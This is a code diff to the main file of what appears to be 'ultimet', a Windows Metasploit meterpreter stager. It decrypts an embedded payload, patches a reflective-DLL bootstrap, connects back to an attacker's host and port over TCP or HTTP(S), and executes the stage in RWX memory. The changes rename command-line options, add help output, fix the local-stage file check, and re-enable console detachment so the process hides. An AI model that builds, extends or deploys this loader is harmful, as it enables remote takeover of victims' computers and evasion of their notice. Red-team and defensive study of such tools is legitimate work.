@@ -36,7 +36,6 @@ The views and conclusions contained in the software and documentation are those
 of the authors and should not be interpreted as representing official policies, 
 either expressed or implied, of the FreeBSD Project.
 */
-
 #include "main.h"
 
 int wmain(int argc, wchar_t *argv[])
@@ -50,6 +49,9 @@ int wmain(int argc, wchar_t *argv[])
 	DWORD index = 0;							// will be used to locate offset of stuff to be patched "transport, the url ... etc."
 	char EncKey[17] = {0};						// XOR Encryption key
 	void (*function)() = nullptr;				// The casted-to-be-function after we have everything in place.
+
+
+	//If "-s" is specified (load stage from local file)
 	wchar_t StageFilePath[MAX_PATH] = {0};		// If the stage is going to be loaded from a dll file from the filesystem, it will be put here. 
 
 	// Reverse_TCP specific Variables
@@ -64,7 +66,7 @@ int wmain(int argc, wchar_t *argv[])
 	// Parse command line arguments, Fill the PAYLOAD_SETTINGS struct et'all... idea from "http://www.cplusplus.com/forum/articles/13355/"
 	for (int i = 1; i < argc; i++) 
 	{
-		if (i + 1 != argc) // Check that we haven't finished parsing already
+		if (i != argc) // Check that we haven't finished parsing already
 			if (wcscmp(argv[i], L"-t") == 0) { //Transport; available options are REVERSE_TCP, REVERSE_HTTP, REVERSE_HTTPS ... case doesn't matter.
 				payload_settings.TRANSPORT = argv[i + 1];
 				_wcsupr(payload_settings.TRANSPORT); // Wide-String-to-uppercase
@@ -85,31 +87,35 @@ int wmain(int argc, wchar_t *argv[])
 					exit(0);
 				}
 				// End of Transport checks
-			} else if (wcscmp(argv[i], L"-lh") == 0) {//LHOST
+			} else if (wcscmp(argv[i], L"-h") == 0) {		//LHOST
 				payload_settings.LHOST = argv[i + 1];
-			} else if (wcscmp(argv[i], L"-lp") == 0) { //LPORT
+			} else if (wcscmp(argv[i], L"-p") == 0) {		//LPORT
 				payload_settings.LPORT = argv[i + 1];
-			} else if (wcscmp(argv[i], L"-sct") == 0) { //SessionCommunicationTimeout in seconds - 300 by default
+			} else if (wcscmp(argv[i], L"-ct") == 0) {		//SessionCommunicationTimeout in seconds - 300 by default
 				payload_settings.comm_timeout = _wtoi(argv[i + 1]);
-			} else if (wcscmp(argv[i], L"-set") == 0) { //SessionExpirationTimeout in seconds - 604800 by default
+			} else if (wcscmp(argv[i], L"-et") == 0) {		//SessionExpirationTimeout in seconds - 604800 by default
 				payload_settings.expiration_timeout = _wtoi(argv[i + 1]);
-			}  else if (wcscmp(argv[i], L"-ua") == 0) { //USER_AGENT
+			}  else if (wcscmp(argv[i], L"-ua") == 0) {		//USER_AGENT
 				payload_settings.USER_AGENT = argv[i + 1];
-			}  else if (wcscmp(argv[i], L"-s") == 0) { //Should we load the stage from a file rather than from the resource?
+			}  else if (wcscmp(argv[i], L"-f") == 0) {		//Should we load the stage from a file rather than from the resource?
 				wcscpy_s(StageFilePath,argv[i + 1]);
+			}  else if (wcscmp(argv[i], L"--help") == 0) {		//Print usage and quit
+				print_header();
+				usage();
+				exit(1);
 			}
 	}
 
-	//Do we have enough parameters?
+	//Do we have minimum parameters?
 	if(payload_settings.TRANSPORT == NULL || payload_settings.LPORT == NULL || payload_settings.LHOST == NULL)
 	{
-		dprintf(L"[-] Not enough parameters! \n");
+		dprintf(L"[-] Not enough parameters! \n\n");
+		usage();
 		exit(0);
 	}
 
-
 	//Have we been asked to load the stage from a file?
-	if(StageFilePath == L"")
+	if(wcscmp(StageFilePath, L"") != 0)
 	{
 		dprintf(L"[*] Loading stage into memory from file \"%s\"\n", StageFilePath);
 		bufferSize = CopyStageToBuffer(StageFilePath, &buffer);
@@ -134,7 +140,7 @@ int wmain(int argc, wchar_t *argv[])
 		XORcrypt(buffer, EncKey, bufferSize);
 		if(memcmp(&buffer[16],"MZ",2))
 		{
-			dprintf(L"[-] Something went really wrong, bad resource, wrong encryption key, or maybe something else ... will exit!\n");
+			dprintf(L"[-] Something went really wrong: bad resource, wrong encryption key, or maybe something else ... will exit!\n");
 			exit(0);
 		}
 		dprintf(L"[*] Looks like stage decrypted correctly, proceeding to patching stage...\n");
@@ -164,7 +170,7 @@ int wmain(int argc, wchar_t *argv[])
 	// Patching ReflectiveDLL bootstrap 
 	index = 0;  //rewind
 	dprintf(L"[*] Patching ReflectiveDll Bootstrap: \"MZ\" Offset 0x%08x\n", index);	
-	memcpy(buffer, ReflectiveDllBootLoader, 62);//dos header
+	memcpy(buffer, ReflectiveDllBootStrap, 62);//overwrite dos header with the ReflectiveDll bootstrap
 
 	//////////////////////////////////////////
 	//  Stuff needed for HTTP/HTTPS only!!  //
@@ -234,8 +240,8 @@ int wmain(int argc, wchar_t *argv[])
 		// My approach to acheive this: We'll first VirtualAlloc size + 5 bytes to another buffer "TempBuffer", skip 5 bytes, then copy the contents 
 		// of "buffer" over, then point buffer to that new TempBuffer ... then take it from there.
 		TempBuffer = (unsigned char*)VirtualAlloc(0, StageSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-		memcpy(TempBuffer + 5, buffer, StageSize);		//making room for 5 bytes ...
-		buffer = TempBuffer;							//Got it? I'm sure there's a better way to do that :).
+		memcpy(TempBuffer + 5, buffer, StageSize);		//skiping first five bytes, then copying buffer contents ...
+		buffer = TempBuffer;							//Got it? I'm sure there's a better way to do that, but I'm not smart enough to figure out how yet :).
 		//////////////////////////////////////////////////
 
 		ConnectSocket = get_socket(payload_settings.LHOST,payload_settings.LPORT);
@@ -317,8 +323,7 @@ int wmain(int argc, wchar_t *argv[])
 	function = (void (*)())buffer;
 
 	dprintf(L"[*] Detaching from console & calling the function, bye bye [ultimet], hello metasploit!\n");
-	//FreeConsole();
+	FreeConsole();
 	function();
-
 	return 0;
 }
